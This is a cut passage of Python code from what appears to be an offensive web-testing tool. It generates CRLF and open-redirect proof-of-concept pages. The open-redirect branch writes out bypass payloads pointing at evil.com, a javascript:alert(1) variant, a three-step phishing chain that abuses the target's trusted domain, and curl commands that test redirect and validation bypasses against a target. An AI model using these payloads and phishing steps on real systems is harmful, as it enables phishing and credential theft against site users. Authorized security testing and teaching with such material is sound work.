                 "filename": f"crlf_payloads_{secrets.token_hex(3)}.html",
                 "content": crlf_html,
                 "note": "CRLF injection payload reference.",
             }},
        ]

    elif etype == "open_redirect":
        redir_html = (
            f"<!DOCTYPE html>\n<html><body>\n"
            f"<h2>Open Redirect PoC</h2>\n"
            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
            f"<p><strong>Parameter:</strong> {param}</p>\n"
            f"<h3>Redirect Payloads:</h3>\n"
            f"<pre>https://evil.com\n"
            f"//evil.com\n"
            f"/\\evil.com\n"
            f"https://target.com@evil.com\n"
            f"https://evil.com#@target.com\n"
            f"javascript:alert(1) (if href-based)\n"
            f"%2f%2fevil.com (URL encoded)</pre>\n"
            f"<h3>Phishing Chain:</h3>\n"
            f"<p>1. Craft redirect URL: {target_base}?{param}=https://evil.com/phish</p>\n"
            f"<p>2. Phishing page mimics target login</p>\n"
            f"<p>3. Victim trusts the URL (starts with legit domain)</p>\n"
            f"</body></html>"
        )
        steps = [
            {"title": "Confirm redirect to external domain",
             "command": f"curl -v {sp} \"{target}\" 2>&1 | grep -i 'location'",
             "note": "Location header should point to evil domain"},
            {"title": "Test double-slash bypass",
             "command": f"curl -v {sp} \"{target_base}?{param}=//evil.com\" 2>&1 | grep -i 'location'",
             "note": "Protocol-relative redirect bypasses some scheme checks"},
            {"title": "Test @ symbol bypass",
             "command": f"curl -v {sp} \"{target_base}?{param}=https://{base_url.split('//')[1] if '//' in base_url else 'target.com'}@evil.com\" 2>&1 | grep -i 'location'",
             "note": "URL with @ may bypass domain validation"},
            {"title": "Test URL-encoded payload",
